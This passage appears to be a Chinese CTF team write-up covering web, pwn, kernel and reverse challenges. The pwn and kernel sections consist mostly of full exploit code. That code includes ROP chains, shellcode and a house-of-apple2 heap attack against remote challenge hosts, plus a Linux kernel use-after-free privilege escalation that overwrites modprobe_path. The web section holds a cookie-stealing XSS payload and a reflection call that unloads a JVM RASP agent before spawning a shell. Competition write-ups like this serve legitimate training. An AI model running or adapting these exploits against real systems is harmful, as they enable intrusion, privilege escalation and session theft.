AABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==”]

with open(“agent.jar”, “ab+”) as f:

for i in data:

f.write(base64.b64decode(i))

对agent.jar进行审计，发现源JVM-SANDBOX项目，发现在启动类中有一个uninstall方法，用来指定删除模块。当前RASP功能默认模块是default，于是想试试能不能直接这么卸载RASP，payload如下，之后就可以直接开始执行命令

JSON

try {

// 使用类加载器动态加载 AgentLauncher 类

Class agentLauncherClass = Class.forName(“com.alibaba.jvm.sandbox.agent.AgentLauncher”);

// 获取 uninstall 方法

System.out.println(agentLauncherClass);

String className =Thread.currentThread().getStackTrace()[1].getClassName();

System.out.println(“当前类名: ” + className);

java.lang.reflect.Method uninstallMethod = agentLauncherClass.getDeclaredMethod(“uninstall”, String.class);

uninstallMethod.invoke(null, “default”);

System.out.println(“Sandbox 卸载成功！”);

} catch (Exception e) {

System.err.println(“调用卸载方法时出错: ” + e.getMessage());

e.printStackTrace();

}

测试了半天的回显，发现可以直接bash弹shell了

Spreader

Content分两次上传

Python

<>          fetch(‘/store’,{method:’POST’,headers:{‘Content-Type’:’application/x-www-form-urlencoded’},body:
encodeURIComponent(document.cookie)});/*


*/

拿完privileged的Cookies，再以privileged的身份上传上述的Payload，再拿admin的Cookies。

Pwn:

qwen

pwn1：

栈溢出修改error_trigger函数指针为后门

触发error到后门

通过open(“/proc/self/maps”)，泄露libc和pie

回到主程序，继续修改函数指针，观察劫持控制流的现场，并抬栈到buf，打rop

Python

from pwn import *

context(os=’linux’, arch=’amd64′, log_level=’debug’)

while True:

#p = process(‘./pwn’)

elf = ELF(‘./pwn’)

p =remote(‘pwn-848a8a75eb.challenge.xctf.org.cn’, 9999,ssl=True)

libc = ELF(‘./libc-2.27.so’)

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 0′)

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 1′)

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 2′)

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 3′)

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 4′)

p.sendafter(‘Is there anything you want to say?’,b’a’*0x8+b’x08’b’x15′)

p.sendlineafter(‘Do you want to end the game [Y/N]’,’N’)

try:

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’14 15′)

p.sendlineafter(‘Please enter the administrator key’,’1804289383′)

sleep(0.2)

p.sendline(‘/proc/self/maps’)

p.recvuntil(‘The debugging information is as follows >>n’)

pie = int(p.recvline()[:12],16)

print(‘[*] pie = ‘,hex(pie))

pop_rdi_ret =pie+0x19b3

leave_ret = pie + 0x1944

ret = pie +0x1945

call_read = pie +0x18ad

p.recvline()

p.recvline()

libc_base = int(p.recvline()[:12],16)

add_rsp_0x68_ret = libc_base + 0x000000000010fc5e

system_addr = libc_base + libc.symbols[‘system’]

binsh_addr = libc_base + next(libc.search(‘/bin/sh’))

print(‘[*] libc = ‘,hex(libc_base))

”’

0x4f2a5 execve(“/bin/sh”, rsp+0x40, environ)

constraints:

rsp & 0xf == 0

rcx == NULL

0x4f302 execve(“/bin/sh”, rsp+0x40, environ)

constraints:

[rsp+0x40] == NULL

0x10a2fc execve(“/bin/sh”, rsp+0x70, environ)

constraints:

[rsp+0x70] == NULL

”’

ogg = libc_base + 0x4f2a5

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 0′)

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 1′)

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 2′)

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 3′)

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’0 4′)

p.sendafter(‘Is there anything you want to say?’,b’a’*0x8+p64(add_rsp_0x68_ret)+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(binsh_addr) + p64(system_addr))

p.sendlineafter(‘Do you want to end the game [Y/N]’,’N’)

#gdb.attach(p,’b *$rebase(0x1022)nc’)

p.sendlineafter(‘请输入下棋的位置（行 列）：’,’14 15′)

break

except:

p.close()

continue

p.sendline(‘cd home/ctf/’)

p.interactive()

pwn2：

一个压缩程序，可以将flag打包成可读文件，打包后直接cat即可

base64解码过后可以得到flag

ezcode

先通过mprotect修改将shellcode地址权限改成7，再通过jmp回到syscall，并提前布置好参数来实现read，读0xf大小

通过第一次read，布置好第二次read，并jmp跳转过去，第二次read长度可控

最后orw

Python

from pwn import *

import json

context(os=’linux’, arch=’amd64′, log_level=’debug’)

p = process(‘./pwn’)

elf = ELF(‘./pwn’)

#p = remote(“pwn-6bc8a8d329.challenge.xctf.org.cn”, 9999, ssl=True)

”’

//mprotect(0x9998000, _ ,7)  13 bytes

mov ax,0xa

shl edi,12

mov dx, 0xf

syscall

//read    9 bytes

xor edi,edi

shl esi,12

xor eax,eax

jmp short  // 跳转回上一个 syscall

”’

gdb.attach(p,’b *$rebase(0x15e0)nb *$rebase(0x18a6)nc’)

payload = ’66b80a00c1e70c66ba0f000f05′

payload += ’31ffc1e60c31c0ebf5′

shellcode = ‘{“shellcode”: “‘

shellcode += payload

shellcode += ‘”}’

p.sendlineafter(‘ input:’,shellcode)

print(“[*] length is “,hex(len(payload)))

”’

xor eax, eax

mov dx, 0xf0

syscall

”’

p.send(b’1xc0fxbaxf0x00x0fx05′.ljust(0xd, b’x90′) + b’xebxf1′)

payload = shellcraft.open(‘/flag’) + shellcraft.read(‘rax’, 0x9998f00, 0x100) + shellcraft.write(1, 0x9998f00, 0x100)

p.sendline(b’a’ * 8 + asm(‘shl esp, 12; add esp, 0x200’) + asm(payload))

p.interactive()

signin_revenge

vuln函数中存在0x30字节的栈溢出，第一次利用栈溢出劫持控制流到puts函数泄露libc地址，并回到vuln；第二次利用栈溢出劫持控制流到gets，向data段读入字符串和ROP并最终回到vuln；第三次利用栈溢出劫持控制流、使用ROP：pop_rbp+data段地址+leave_ret实现栈迁移，最终orw读出flag；

Python

from pwn import *

import sys

file = “./vuln”

if len(sys.argv) == 1 or sys.argv[1] == ‘l’:

sh = process(file)

elif sys.argv[1] == ‘r’:

sh = remote(“pwn-6fc638b866.challenge.xctf.org.cn”, 9999, ssl=True)

elf = ELF(file)

def ru(string):

sh.recvuntil(string)

def dbg():

if len(sys.argv) > 1 and sys.argv[1] == ‘r’:

return

gdb.attach(sh)

pause()

def sl(content):

sh.sendline(content)

def itr():

sh.interactive()

context.log_level = ‘debug’

def get_heap():

res = 0

res = u64(sh.recvuntil(“x55”, timeout=0.2)[-6:].ljust(8, b‘x00’))

if res == 0:

res = u64(sh.recvuntil(“x56”, timeout=0.2)[-6:].ljust(8, b‘x00’))

return res

def get_libc():

res = 0

res = u64(sh.recvuntil(“x7f”, timeout=0.2)[-6:].ljust(8, b‘x00’))

if res == 0:

res = u64(sh.recvuntil(“x7e”, timeout=0.2)[-6:].ljust(8, b‘x00’))

return res

def get_tcache():

res = u64(sh.recvuntil(“x05”)[-5:].ljust(8, b“x00”))

return res

def func():

pop_rdi = 0x0000000000401393

puts_got = elf.got[‘puts’]

puts_plt = elf.plt[‘puts’]

vuln = 0x4012C0

#ru(“lets move and pwn!”)

pay = b‘a’*0x108 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)

sl(pay)

puts = u64(sh.recvuntil(“x7f”)[-6:].ljust(8, b‘x00’))

print(“puts :”, hex(puts))

libc = ELF(“./libc.so.6”)

base = puts – libc.sym[‘puts’]

print(“base :”, hex(base))

_open = base + libc.sym[‘open’]

pop_rsi = base + 0x000000000002601f

flag = base + 0x0000000000012efb

print(“flag :”, hex(flag))

pop_rdx = base + 0x0000000000142c92

pay = b‘a’*0x108+p64(pop_rsi)+p64(0x404088)+p64(elf.plt[‘read’])+p64(vuln)

sl(pay)

pay = b“flag”+b‘x00’*4

pay += p64(pop_rdi) + p64(0x404088) + p64(pop_rsi) + p64(0) + p64(_open)

pay += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x404088+0x200) + p64(pop_rdx) + p64(0x100) + p64(elf.plt[‘read’])

pay += p64(pop_rdi) + p64(0x404088+0x200) + p64(puts_plt)

sl(pay)

leave_ret = 0x4012EE

pop_rbp = 0x000000000040117d

dbg()

pay = b‘a’*0x108+p64(pop_rbp) + p64(0x404088) + p64(leave_ret)

sl(pay)

sh.interactive()

if __name__ == “__main__”:

func()

signin

首先是输入name，然后有一个关于随机数的校验，由于输入name存在溢出且输入之后存在一个printf %s的输出反馈，可以利用这个泄露随机数的时间种子，从而绕过；然后进入到主程序是一个菜单堆，且add功能中存在一个和signin_revenge中vuln函数逻辑一样的O_o漏洞函数，利用方法完全一致，不再赘述；

Python

from pwn import *

import sys

from ctypes import CDLL

file = “./vuln”

if len(sys.argv) == 1 or sys.argv[1] == ‘l’:

sh = process(file)

elif sys.argv[1] == ‘r’:

sh = remote(“pwn-aaafe75338.challenge.xctf.org.cn”, 9999, ssl=True)

elf = ELF(file)

def ru(string):

sh.recvuntil(string)

def dbg():

if len(sys.argv) > 1 and sys.argv[1] == ‘r’:

return

gdb.attach(sh)

pause()

def sl(content):

sh.sendline(content)

def itr():

sh.interactive()

context.log_level = ‘debug’

def get_heap():

res = 0

res = u64(sh.recvuntil(“x55”, timeout=0.2)[-6:].ljust(8, b‘x00’))

if res == 0:

res = u64(sh.recvuntil(“x56”, timeout=0.2)[-6:].ljust(8, b‘x00’))

return res

def get_libc():

res = 0

res = u64(sh.recvuntil(“x7f”, timeout=0.2)[-6:].ljust(8, b‘x00’))

if res == 0:

res = u64(sh.recvuntil(“x7e”, timeout=0.2)[-6:].ljust(8, b‘x00’))

return res

def get_tcache():

res = u64(sh.recvuntil(“x05”)[-5:].ljust(8, b“x00”))

return res

def attack():

pop_rdi = 0x0000000000401893

puts_got = elf.got[‘puts’]

puts_plt = elf.plt[‘puts’]

vuln = 0x4013C0

#ru(“lets move and pwn!”)

pay = b‘a’*0x108 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)

sl(pay)

puts = u64(sh.recvuntil(“x7f”)[-6:].ljust(8, b‘x00’))

print(“puts :”, hex(puts))

libc = ELF(“./libc.so.6”)

base = puts – libc.sym[‘puts’]

print(“base :”, hex(base))

_open = base + libc.sym[‘open’]

pop_rsi = base + 0x000000000002601f

pop_rdx = base + 0x0000000000142c92

#dbg()

#pay = b’a’*0x108+p64(pop_rsi)+p64(0x404108)+p64(elf.plt[‘read’])+p64(vuln)

pay = b‘a’*0x108+p64(pop_rdi)+p64(0x404108)+p64(base+libc.sym[‘gets’])+p64(vuln)

sl(pay)

pay = b“flag”.ljust(8, b‘x00’)

pay += p64(pop_rdi) + p64(0x404108) + p64(pop_rsi) + p64(0) + p64(_open)

pay += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x404108+0x200) + p64(pop_rdx) + p64(0x100) + p64(elf.plt[‘read’])

pay += p64(pop_rdi) + p64(0x404108+0x200) + p64(puts_plt) + p64(vuln)

pay += p64(pop_rdi) + p64(1) + p64(0x404108+0x200) + p64(pop_rdx) + p64(0x100) + p64(base+libc.sym[‘write’])+p64(vuln)

sl(pay)

leave_ret = 0x4013EE

pop_rbp = 0x000000000040127d

pay = b‘a’*0x108+p64(pop_rbp) + p64(0x404108) + p64(leave_ret)

sl(pay)

def func():

h = CDLL(“./libc.so.6”)

sh.send(“n”*(0x16-0x8))

ru(“User Name”)

ru(“n”*(0x16-0x8))

seed = u32(sh.recv(4))

print(“seed :”, hex(seed))

h.srand(seed)

for _ in range(100):

num = h.rand()

num = num % 100 + 1

#print(“rand :”, num)

ru(“Input the authentication code:”)

sh.send(p32(num))

ru(“>>”)

sh.send(p32(1))

ru(“Index:”)

sh.send(p32(1))

ru(“Note”)

sh.send(“a”*0x100)

attack()

sh.interactive()

if __name__ == “__main__”:

func()

ker

kmalloc-64的UAF，（两次free、一次edit）存在cg隔离，因此使用内核密钥+pg_vec，首先分配该结构并释放，然后利用内核密钥占据该obj，之后再次释放，然后使用pg_vec占位，此时内核密钥被覆盖，长度被改写，通过越界读+爆破泄露内核地址，然后利用edit功能修改pg_vec为modprobe_path所在页，mmap映射，修改modprobe_path的内容，触发错误以在特权下修改flag权限，最终读出flag；

C

#define _GNU_SOURCE

#include

#include

#include

#include

#include

#include

#include

#include

//CPU绑核

void bindCore(int core)

{

cpu_set_t cpu_set;

CPU_ZERO(&cpu_set);

CPU_SET(core, &cpu_set);

sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

printf(“ 33[34m 33[1m[*] Process binded to core  33[0m%dn”, core);

}

int dev_fd;

void add_note(char *con){

void *args = con;

ioctl(dev_fd, 0x20, &args);

}

void free_note(){

ioctl(dev_fd, 0x30, “AAAAAAAA”);

}

#include “key.h”

//============================================= pg_vec ===================================================================

#include

#include

#include

#include

#include

#include

void err_exit(char *s){

perror(s);

exit(-1);

}

void unshare_setup(void)

{

char edit[0x100];

int tmp_fd;

if(unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET))

err_exit(“FAILED to create a new namespace”);

tmp_fd = open(“/proc/self/setgroups”, O_WRONLY);

write(tmp_fd, “deny”, strlen(“deny”));

close(tmp_fd);

tmp_fd = open(“/proc/self/uid_map”, O_WRONLY);

snprintf(edit, sizeof(edit), “0 %d 1”, getuid());

write(tmp_fd, edit, strlen(edit));

close(tmp_fd);

tmp_fd = open(“/proc/self/gid_map”, O_WRONLY);

snprintf(edit, sizeof(edit), “0 %d 1”, getgid());

write(tmp_fd, edit, strlen(edit));

close(tmp_fd);

}

void packet_socket_rx_ring_init(int s, unsigned int block_size,

unsigned int frame_size, unsigned int block_nr,

unsigned int sizeof_priv, unsigned int timeout) {

int v = TPACKET_V3;

int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));

if (rv < 0) puts(“setsockopt(PACKET_VERSION)”), exit(-1);

struct tpacket_req3 req;

memset(&req, 0, sizeof(req));

req.tp_block_size = block_size;

req.tp_frame_size = frame_size;

req.tp_block_nr = block_nr;

req.tp_frame_nr = (block_size * block_nr) / frame_size;

req.tp_retire_blk_tov = timeout;

req.tp_sizeof_priv = sizeof_priv;

req.tp_feature_req_word = 0;

rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));

if (rv < 0) puts(“setsockopt(PACKET_RX_RING)”), exit(-1);

}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,

unsigned int block_nr, unsigned int sizeof_priv, int timeout) {

int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

if (s < 0) puts(“socket(AF_PACKET)”), exit(-1);

packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv, timeout);

struct sockaddr_ll sa;

memset(&sa, 0, sizeof(sa));

sa.sll_family = PF_PACKET;

sa.sll_protocol = htons(ETH_P_ALL);

sa.sll_ifindex = if_nametoindex(“lo”);

sa.sll_hatype = 0;

sa.sll_pkttype = 0;

sa.sll_halen = 0;

int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));

if (rv < 0) puts(“bind(AF_PACKET)”), exit(-1);

return s;

}

// count 为 pg_vec 数组的大小, 即 pg_vec 的大小为 count*8

// size/4096 为要分配的 order

int pagealloc_pad(int count, int size) {

return packet_socket_setup(size, 2048, count, 0, 100);

}

//========================================================================================================================

size_t ker_offset;

void edit_note(char *con){

void *args = con;

ioctl(dev_fd, 0x50, &args);

}

void get_flag(){

system(“touch ./tmp/error”);

int efd = open(“./tmp/error”, 2);

write(efd, “xffxffxffxff”, 4);

close(efd);

system(“chmod +x ./tmp/error”);

char *cmd = “#!/bin/shnchmod 777 /flag”;

system(“touch ./tmp/my_shell.sh”);

int f = open(“./tmp/my_shell.sh”, 2);

write(f, cmd, strlen(cmd));

close(f);

system(“chmod +x ./tmp/my_shell.sh”);

system(“./tmp/error”);

char flag[0x1000];

int fd3 = open(“/flag”, 2);

printf(“fd3 == %dn”, fd3);

read(fd3, flag, 0x80);

puts(flag);

//getchar();

}

int main(){

bindCore(0);

unshare_setup();

dev_fd = open(“/dev/ker”, 0);

printf(“dev_fd == %dn”, dev_fd);

add_note(“AAAAAAAA”);

free_note();

#define TOTAL_KEYS 200

int key_ids[TOTAL_KEYS];

char des[0x100];

char pay[0x100];

memset(des, 0, sizeof(des));

memset(pay, 0, sizeof(pay));

for(int i = 0; i < TOTAL_KEYS; i++){

memset(des, ‘A’+i, 0x80);

memset(pay, ‘a’+i, 0x40-0x18);

key_ids[i] = key_alloc(des, pay, 0x40-0x18);

//printf(“kid == %dn”, key_ids[i]);

}

free_note();

#define TOTAL_PFDS 200

int pfds[TOTAL_PFDS];

for(int i = 0; i < TOTAL_PFDS; i++){

pfds[i] = pagealloc_pad(8, 0x1000);

if(pfds[i] < 0){

perror(“pfds”);

break;

}

//printf(“pfd == %dn”, pfds[i]);

}

int victim_kid = -1;

size_t data[0x10000];

int keylen;

for(int i = 0; i < TOTAL_KEYS; i++){

keylen = key_read(key_ids[i], data, 0x40-0x18);

if(keylen > 0x28){

victim_kid = i;

break;

}

}

printf(“victim_kid == %dn”, victim_kid);

for(int i = 0; i < TOTAL_KEYS; i++){

if(i == victim_kid) continue;

key_revoke(key_ids[i]);

}

//leak goal 0xffffffff81d5d250

size_t leak = 0LL;

key_read(key_ids[victim_kid], data, keylen);

for(int i = 0; i < 0x1000; i++){

//printf(“leak : %pn”, (void *)data[i]);

if(data[i] >= 0xffffffff00000000){

if((data[i] & 0xffff) == 0xd250){

leak = data[i];

ker_offset = leak – 0xffffffff81d5d250;

break;

}

if((data[i] & 0xffff) == 0x6070){

leak = data[i];

ker_offset = leak – 0xffffffff81e26070;

break;

}

if((data[i] & 0xffff) == 0x8850){

leak = data[i];

ker_offset = leak – 0xffffffff81608850;

break;

}

if((data[i] & 0xffff) == 0xca40){

leak = data[i];

ker_offset = leak – 0xffffffff8236ca40;

break;

}

}

}

printf(“leak == %pn”, (void *)leak);

printf(“ker_offset == %pn”, (void *)ker_offset);

size_t func_addr = ker_offset + 0xffffffff810fc6e0;

size_t modprobe = ker_offset + 0xffffffff831d8ce0;

printf(“goal : %pn”, (void *)func_addr);

//size_t goal_page = func_addr – (func_addr & 0xfff);

size_t goal_page = modprobe – (modprobe & 0xfff);

edit_note(&goal_page);

char *pages[TOTAL_PFDS];

for(int i = 0; i < TOTAL_PFDS; i++){

pages[i] = mmap(NULL, 0x1000*8, PROT_READ|PROT_WRITE, MAP_SHARED, pfds[i], 0);

if (pages[i] == MAP_FAILED) {

printf(“fail mmap id : %d, file descriptor == %dn”, i, pfds[i]);

perror(“mmap”);

break;

}

}

puts(“mmap done”);

//getchar();

char file[] = “/tmp/tmp/my_shell.sh”;

for(int i = 0; i < TOTAL_PFDS; i++){

printf(“page == %pn”, pages[i]);

memcpy(pages[i]+(modprobe&0xfff), file, strlen(file));

}

puts(“write done”);

//getchar();

get_flag();

}

C

#include

#include

#include

#define KEY_SPEC_PROCESS_KEYRING    -2  /* – key ID for process-specifi*/

#define KEYCTL_UPDATE           2   /* update a key */

#define KEYCTL_REVOKE           3   /* revoke a key */

#define KEYCTL_UNLINK           9   /* unlink a key from a keyring */

#define KEYCTL_READ         11  /* read a key or keyring’s cont*/

int key_alloc(char *description, char *payload, size_t plen)

{

return syscall(__NR_add_key, “user”, description, payload, plen,

KEY_SPEC_PROCESS_KEYRING);

}

int key_update(int keyid, char *payload, size_t plen)

{

return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);

}

int key_read(int keyid, char *buffer, size_t buflen)

{

return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);

}

int key_revoke(int keyid)

{

return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);

}

int key_unlink(int keyid)

{

return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);

}

guest_book

size非常大的菜单堆，存在UAF，使用largebin attack劫持IO_list_all打house of apple2：

Python

from pwn import *

import sys

file = “./pwn”

if len(sys.argv) == 1 or sys.argv[1] == ‘l’:

sh = process(file)

elif sys.argv[1] == ‘r’:

sh = remote(“pwn-d96cac3186.challenge.xctf.org.cn”, 9999, ssl=True)

elf = ELF(file)

def ru(string):

sh.recvuntil(string)

def dbg():

if len(sys.argv) > 1 and sys.argv[1] == ‘r’:

return

gdb.attach(sh)

pause()

def sl(content):

sh.sendline(content)

def itr():

sh.interactive()

context.log_level = ‘debug’

def get_heap():

res = 0

res = u64(sh.recvuntil(“x55”, timeout=0.2)[-6:].ljust(8, b‘x00’))

if res == 0:

res = u64(sh.recvuntil(“x56”, timeout=0.2)[-6:].ljust(8, b‘x00’))

return res

def get_libc():

res = 0

res = u64(sh.recvuntil(“x7f”, timeout=0.2)[-6:].ljust(8, b‘x00’))

if res == 0:

res = u64(sh.recvuntil(“x7e”, timeout=0.2)[-6:].ljust(8, b‘x00’))

return res

def get_tcache():

res = u64(sh.recvuntil(“x05”)[-5:].ljust(8, b“x00”))

return res

def choice(num):

ru(“>”)

sl(str(num))

def add(idx, size):

choice(1)

ru(“index”)

sl(str(idx))

ru(“size”)

sl(str(size))

def show(idx):

choice(4)

ru(“index”)

sl(str(idx))

def edit(idx, con):

choice(2)

ru(“index”)

sl(str(idx))

ru(“content”)

sh.send(con)

def free(idx):

choice(3)

ru(“index”)

sl(str(idx))

def func():

add(0, 0x5a0)

add(1, 0x508)

add(2, 0x580)

add(3, 0x500)

free(0)

show(0)

addr = u64(sh.recvuntil(b“x7f”)[-6:].ljust(8, b‘x00’))

print(“addr :”, hex(addr))

read = addr – 0x106510

libc = ELF(“./libc.so.6”)

base = read – libc.sym[‘read’]

print(“base :”, hex(base))

listall = base + libc.sym[‘_IO_list_all’]

pause()

add(4, 0x600)

pay = p64(0)*3+p64(listall-0x20)

edit(0, pay)

free(2)

add(5, 0x600)

edit(2, ‘a’*8)

show(2)

heap = u64(sh.recvuntil(b“x55”)[-6:].ljust(8, b‘x00’))

print(“heap :”, hex(heap))

f1_addr = heap + 0xac0

print(“f1_addr :”, hex(f1_addr))

pause()

pay = b‘a’*0x500+b‘  _;shx00′

edit(1, pay)

system = base + libc.sym[‘system’]

jumps = base + libc.sym[‘_IO_wfile_jumps’]

pay = b‘x00’*0x18+p64(1)

pay = pay.ljust(0x58, b‘x00’)

pay += p64(system)

pay = pay.ljust(0x90, b‘x00’)

pay += p64(f1_addr)

pay = pay.ljust(0xc8, b‘x00’)

pay += p64(jumps)

pay += p64(f1_addr)

edit(2, pay)

dbg()

sh.interactive()

if __name__ == “__main__”:

func()

Reverse:

serv1ce

JSON

#include

int main()

{

char enc[] = { 0xB9, 0x32, 0xC2, 0xD4, 0x69, 0xD5, 0xCA, 0xFB, 0xF8, 0xFB,

0x80, 0x7C, 0xD4, 0xE5, 0x93, 0xD5, 0x1C, 0x8B, 0xF8, 0xDF,

0xDA, 0xA1, 0x11, 0xF8, 0xA1, 0x93, 0x93, 0xC2, 0x7C, 0x8B,

0x1C, 0x66, 0x01, 0x3D, 0xA3, 0x67 };

//bArr[i3] = (byte)(((str.charAt(i3 % str.length()) – ‘w’) ^ 23) & 255);

char key_arry[64] = {0};

char key[] = “1liIl11lIllIIl11llII”;

for (int i = 0; i < 64; i++) {

key_arry[i] = ((key[i % 20] – ‘w’) ^ 23) % 256;

}

int num = 11;

char flag[36] = {0};

for (int i = 0; i < 36; i++) {

for (int j = 0; j < ‘}’; j++) {

if ((char)(num * (j ^ key_arry[i])) == enc[i]) {

flag[i] = j;

}

}

}

printf(“%s”, flag);

}

easyre

Tracecode，比较长度0x38

两处数据获取

输入测试数据 ‘A’ * 0x38 密文如下

8字节相同，说明加密时8字节一组

先猜一个TEA算法，trace里搜 9E3779B9

执行次数 714 次，714 / 7 = 102，每组执行了102轮

搜到指令 shr r8d,B ，对应XTEA算法中的 (sum>>11)，找到KEY读取的代码

0xEF6FD9DB, 0xD2C273D3, 0x6F97E412, 0x72BFD624

测试发现输入前对密文 xor 0xBF

JSON

#include

#include

/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] – key[3] */

void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {

unsigned int i;

uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;

for (i=0; i < num_rounds; i++) {

v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);

sum += delta;

v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);

}

v[0]=v0; v[1]=v1;

}

void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {

unsigned int i;

uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;

for (i=0; i < num_rounds; i++) {

v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);

sum -= delta;

v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);

}

v[0]=v0; v[1]=v1;

}

int main()

{

uint32_t v[]={0x9851E3A1, 0x49765686, 0x812B6B6F, 0x9612CECF, 0x3C3570A2, 0xF15C6231, 0xAA6B77FA, 0xBE056D9E,

0xF8A424E8, 0x0B3A23DB, 0x03CC2016, 0xA92BB5AD, 0x1D789F34, 0x9EF9B92E,0};

uint32_t const k[4]={0xEF6FD9DB, 0xD2C273D3, 0x6F97E412, 0x72BFD624};

unsigned int r=102;//num_rounds建议取值为32

// v为要加密的数据是两个32位无符号整数

// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位

for(int i = 0; i< 7;i++){

decipher(r, (v + i * 2), k);

}

for(int i = 0;i<14;i++){

v[i] ^= 0xbfbfbfbf;

}

for(int i = 0;i< 0x38 ;i++){

printf(“%.2x “, *((char* )(v)+i) & 0xff);

}

printf(“n”);

printf(“%sn”,v);

return 0;

}

66 6c 61 67 7b 75 5f 61 72 b3 5f 72 65 40 b1 b1 79 5f 67 b0 b0 64 5f 40 74 5f b0 b1 b1 76 6d 5f 64 65 b0 62 66 5f 61 6e 64 5f 61 6e 74 69 5f 64 65 62 75 67 67 65 72 7d

发现仍有乱码，bx，这些转成数字 3x

A_game

有个调试器检测，判断其不是被powershell或者正常打开的就会退出，这里patch了

首先通过读写文件的api定位到关键函数，其中该函数会在退出游戏时调用。

把game.tmp解密产生了game.ps1

ps1是个混淆的powershell脚本，每段脚本最前面是个iex 执行，去掉后运行一下，可直接解密出下一段脚本，

继续运行，得到真正的加密脚本。

对照其加密逻辑解密即可

JSON

enc = [38304, 8928, 43673, 25957, 67260, 47152, 16656, 62832,

19480, 66690, 40432, 15072, 63427, 28558, 54606,

47712, 18240, 68187, 18256, 63954, 48384, 14784,

60690, 21724, 53238, 64176, 9888, 54859, 23050,

58368, 46032, 15648, 64260, 17899, 52782, 51968,

12336, 69377, 27844, 43206, 63616]

key2 = [0x70, 0x30, 0x77, 0x65, 0x72]

for i in range(len(enc)):

enc[i] -= key2[i % len(key2)]

for i in range(len(enc)):

enc[i] -= key2[i % len(key2)]

key3 = [0x70, 0x30, 0x77, 0x33, 0x72]

for i in range(len(enc)):

enc[i] = int(enc[i] / key3[i % len(key3)])

for i in range(len(enc)):

enc[i] -= key2[i % len(key2)]

for i in range(len(enc)):

enc[i] -= key2[i % len(key2)]

for i in range(len(enc)):

enc[i] -= key2[i % len(key2)]

def rc4(key, plaintext):

S = list(range(256))

j = 0

for i in range(256):

j = (j + S[i] + key[i % len(key)]) % 256

S[i], S[j] = S[j], S[i]

i = 0

j = 0

ciphertext = []

for k in range(len(plaintext)):

i = (i + 1) % 256

j = (j + S[i]) % 256

S[i], S[j] = S[j], S[i]

t = (S[i] + S[j]) % 256

ciphertext.append(plaintext[k] ^ S[t])

return ciphertext

def enenenenene1_decrypt(encrypted_data):

key = [0x70, 0x6f, 0x77, 0x65, 0x72]

plaintext = “”

for _ in range(36):

current_encrypted_text = encrypted_data[:-len(key)]

current_key = rc4(current_encrypted_text,encrypted_data[-len(key):])

current_encrypted_text = rc4(current_key, current_encrypted_text)

plaintext = current_encrypted_text

return plaintext

decrypted_plaintext = enenenenene1_decrypt(enc)

for c in decrypted_plaintext:

print(chr(c),end=””)

babyre

标准AES,KEY 35 77 40 2E CC A4 4A 3F  9A B7 21 82 F9 B0 1F 35

不过这里是无填充的

后面是转成二进制然后求z3

z3转太麻烦了，不如直接爆破

JSON

#include

int check(int a1[])

{

int v1;          // r8d

int v2;          // ecx

int v3;          // ecx

int ANS[12];     // [rsp+8h] [rbp-38h]

int i;           // [rsp+38h] [rbp-8h]

unsigned int v7; // [rsp+3Ch] [rbp-4h]

v7 = 1;

for (int i = 0; i < 12; i++)

{

ANS[i] = a1[11 – i];

}

v7 = 0;

return v7;

}

int main()

{

int ANS[12];

for (int i = 0; i < 16; i++)

{

ANS[8] = i & 0x8 ? 1 : 0;

ANS[9] = i & 0x4 ? 1 : 0;

ANS[10] = i & 0x2 ? 1 : 0;

ANS[11] = i & 0x1 ? 1 : 0;

for (int x = 0; x < 256; x++)

{

for (int j = 0; j < 8; j++)

{

ANS[j] = (x >> (7 – j) & 1) ? 1 : 0;

}

// Check

// for (int q = 0; q < 12; q++)

// {

//     printf(“%d”, ANS[q]);

// }

// printf(“n”);

if (check(ANS))

{

printf(“%.2xn”, x);

}

}

}

return 0;

}

得到AES后的密文 128fecc28504b24c5bba4acf11360a48

应输入 4d87ef03-77bb-491a-80f5-4620245807c4

Misc:

ezflag

